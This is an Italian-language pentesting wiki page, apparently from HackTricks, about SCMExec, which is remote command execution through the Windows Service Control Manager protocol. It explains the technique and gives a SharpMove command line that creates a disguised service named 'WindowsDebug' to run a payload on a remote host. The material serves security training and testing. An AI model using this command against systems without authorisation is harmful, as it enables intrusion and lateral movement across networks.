# SCMExec

{{#include ../../banners/hacktricks-training.md}}

## Come funziona

Il Service Control Manager Remote Protocol (SCMR) è un protocollo basato su RPC per configurare e controllare i servizi Windows su un computer remoto. Con autorizzazioni sufficienti, un operatore può creare o riconfigurare un servizio il cui percorso del binario contiene un comando e quindi avviare tale servizio per eseguire il comando da remoto.<sup>[[1]](#references)</sup>

## Strumenti

**SharpMove** supporta l'esecuzione remota autenticata tramite SCM e diversi altri meccanismi Windows. Nell'esempio seguente viene selezionata la sua azione SCM, viene creato un servizio denominato `WindowsDebug` e viene indicato un payload già presente sull'host remoto.<sup>[[2]](#references)</sup>
```powershell
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```
## References

- [1] [Microsoft Open Specifications - panoramica del Service Control Manager Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
- [2] [GitHub - SharpMove](https://github.com/0xthirteen/SharpMove)
{{#include ../../banners/hacktricks-training.md}}
